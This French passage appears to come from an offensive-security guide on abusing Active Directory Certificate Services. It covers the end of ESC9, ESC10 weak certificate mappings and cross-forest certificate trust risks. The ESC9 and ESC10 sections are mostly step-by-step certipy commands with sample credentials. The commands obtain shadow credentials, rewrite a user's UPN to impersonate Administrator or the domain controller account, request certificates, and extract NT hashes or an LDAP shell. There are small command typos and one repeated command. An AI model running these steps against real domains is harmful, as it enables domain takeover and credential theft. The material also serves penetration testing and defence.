Il est noté que le `userPrincipalName` du certificat reflète `Administrator`, sans aucun "object SID".

Le `userPrincipalName` de `Jane` est ensuite rétabli à son original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
En tentant l'authentification avec le certificat émis, on obtient maintenant le hachage NT de `Administrator@corp.local`. La commande doit inclure `-domain <domain>` en raison du manque de spécification de domaine du certificat :
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Faibles Mappages de Certificats - ESC10

### Explication

Deux valeurs de clé de registre sur le contrôleur de domaine sont mentionnées par ESC10 :

- La valeur par défaut de `CertificateMappingMethods` sous `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` est `0x18` (`0x8 | 0x10`), précédemment définie sur `0x1F`.
- Le paramètre par défaut de `StrongCertificateBindingEnforcement` sous `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` est `1`, précédemment `0`.

**Cas 1**

Lorsque `StrongCertificateBindingEnforcement` est configuré comme `0`.

**Cas 2**

Si `CertificateMappingMethods` inclut le bit `UPN` (`0x4`).

### Cas d'Abus 1

Avec `StrongCertificateBindingEnforcement` configuré comme `0`, un compte A avec des permissions `GenericWrite` peut être exploité pour compromettre n'importe quel compte B.

Par exemple, en ayant des permissions `GenericWrite` sur `Jane@corp.local`, un attaquant vise à compromettre `Administrator@corp.local`. La procédure reflète ESC9, permettant à n'importe quel modèle de certificat d'être utilisé.

Initialement, le hachage de `Jane` est récupéré en utilisant les Informations d'Identification d'Ombre, exploitant le `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Ensuite, le `userPrincipalName` de `Jane` est modifié en `Administrateur`, en omettant délibérément la partie `@corp.local` pour éviter une violation de contrainte.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Suivant cela, un certificat permettant l'authentification du client est demandé en tant que `Jane`, en utilisant le modèle par défaut `Utilisateur`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` de `Jane` est ensuite rétabli à son original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Authentifier avec le certificat obtenu produira le hachage NT de `Administrator@corp.local`, nécessitant la spécification du domaine dans la commande en raison de l'absence de détails de domaine dans le certificat.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Cas d'abus 2

Avec les `CertificateMappingMethods` contenant le drapeau `UPN` (`0x4`), un compte A avec des autorisations `GenericWrite` peut compromettre n'importe quel compte B ne disposant pas d'une propriété `userPrincipalName`, y compris les comptes machine et l'administrateur de domaine intégré `Administrator`.

Ici, l'objectif est de compromettre `DC$@corp.local`, en commençant par obtenir le hachage de `Jane` via les informations d'identification Shadow, en exploitant le `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` de `Jane` est ensuite défini sur `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Un certificat d'authentification client est demandé en tant que `Jane` en utilisant le modèle `Utilisateur` par défaut.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` de `Jane` est revenu à son état d'origine après ce processus.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Pour s'authentifier via Schannel, l'option `-ldap-shell` de Certipy est utilisée, indiquant le succès de l'authentification comme `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
À travers le shell LDAP, des commandes telles que `set_rbcd` permettent des attaques de délégation contrainte basée sur les ressources (RBCD), compromettant potentiellement le contrôleur de domaine.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Cette vulnérabilité s'étend également à tout compte utilisateur ne disposant pas d'un `userPrincipalName` ou lorsque celui-ci ne correspond pas au `sAMAccountName`, le `Administrator@corp.local` par défaut étant une cible principale en raison de ses privilèges LDAP élevés et de l'absence d'un `userPrincipalName` par défaut.


## Compromission des forêts avec des certificats expliquée à la voix passive

### Rupture des confiances inter-forêts par des AC compromis

La configuration de **l'inscription inter-forêts** est relativement simple. Le **certificat de l'AC racine** de la forêt de ressources est **publié aux forêts de compte** par les administrateurs, et les **certificats de l'AC d'entreprise** de la forêt de ressources sont **ajoutés aux conteneurs `NTAuthCertificates` et AIA dans chaque forêt de compte**. Pour clarifier, cet arrangement accorde à **l'AC de la forêt de ressources un contrôle complet** sur toutes les autres forêts qu'elle gère en matière de PKI. Si cet AC est **compromis par des attaquants**, des certificats pour tous les utilisateurs des forêts de ressources et de compte pourraient être **contrefaits par eux**, rompant ainsi la frontière de sécurité de la forêt.

### Privilèges d'inscription accordés à des principaux étrangers

Dans les environnements multi-forêts, il convient de faire preuve de prudence concernant les AC d'entreprise qui **publient des modèles de certificat** permettant aux **Utilisateurs Authentifiés ou aux principaux étrangers** (utilisateurs/groupes externes à la forêt à laquelle l'AC d'entreprise appartient) **d'avoir des droits d'inscription et de modification**.\
Lors de l'authentification à travers une confiance, le **SID des Utilisateurs Authentifiés** est ajouté au jeton de l'utilisateur par AD. Ainsi, si un domaine possède un AC d'entreprise avec un modèle qui **autorise les droits d'inscription des Utilisateurs Authentifiés**, un modèle pourrait potentiellement être **inscrit par un utilisateur d'une forêt différente**. De même, si **des droits d'inscription sont explicitement accordés à un principal étranger par un modèle**, une **relation de contrôle d'accès inter-forêts est ainsi créée**, permettant à un principal d'une forêt d'**inscrire un modèle d'une autre forêt**.

Les deux scénarios entraînent une **augmentation de la surface d'attaque** d'une forêt à une autre. Les paramètres du modèle de certificat pourraient être exploités par un attaquant pour obtenir des privilèges supplémentaires dans un domaine étranger.
